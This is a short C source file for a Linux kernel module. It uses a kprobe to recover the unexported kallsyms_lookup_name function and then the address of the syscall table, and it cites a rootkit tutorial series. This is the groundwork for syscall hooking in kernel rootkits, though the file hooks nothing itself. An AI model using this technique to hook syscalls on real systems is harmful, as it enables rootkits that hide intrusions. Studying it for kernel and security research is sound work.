/*
  library for getting the syscall table and kallsyms_lookup_name
	- kallsyms_lookup_name is no longer exported, so this is a workaround
		see the links below for more
			-  https://xcellerator.github.io/posts/linux_rootkits_11/
			-  https://gist.github.com/linuxthor/a2b2ef9e39470fd6dd188b25c427322b
		if not available lookup kallsyms_lookup_name not exported workaround
*/

#include <linux/kernel.h> //contains types, macros, functions for the kernel   e.g. KERN_INFO
#include <linux/unistd.h> //contains syscall names to numbers
#include <linux/kprobes.h> //kprobes- used in workaround for kallsyms_lookup_name not exported



//syscall table adress
unsigned long * __sys_call_table = NULL;  //NULL = (void*)0
/* typedef for kallsyms_lookup_name() so kp.addr can be easily cast, and makes formatting nicer*/
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
//function for kallysms_lookup_name_workaround definition
kallsyms_lookup_name_t kallsyms_lookup_name_workaround=(kallsyms_lookup_name_t) 0;
//function to generate kallsyms_lookup_name
static void generate_kallsyms_lookup_name_workaround(void);



// finds the memory adress of the sycall table and stores it in __sys_call_table
static void get_syscall_table(void){
	//checks if kallsyms_lookup_name has been created
	if (kallsyms_lookup_name_workaround==(kallsyms_lookup_name_t) NULL){
		generate_kallsyms_lookup_name_workaround();
	}
	 __sys_call_table = (unsigned long*) kallsyms_lookup_name_workaround("sys_call_table");
	return;
}


//uses kprobe to find the memory adress of kallsyms_lookup_name and creates function
static void generate_kallsyms_lookup_name_workaround(void){
	struct kprobe kp = { //kprobe definition
		.symbol_name = "kallsyms_lookup_name"
	};
	/* register the kallsyms_lookup_name kprobe*/
	register_kprobe(&kp);
	/* assign kallsyms_lookup_name symbol to kp.addr */
	kallsyms_lookup_name_workaround = (kallsyms_lookup_name_t) kp.addr;
	/* done with the kallsyms_lookup_name kprobe, so unregister it */
	unregister_kprobe(&kp);
  }
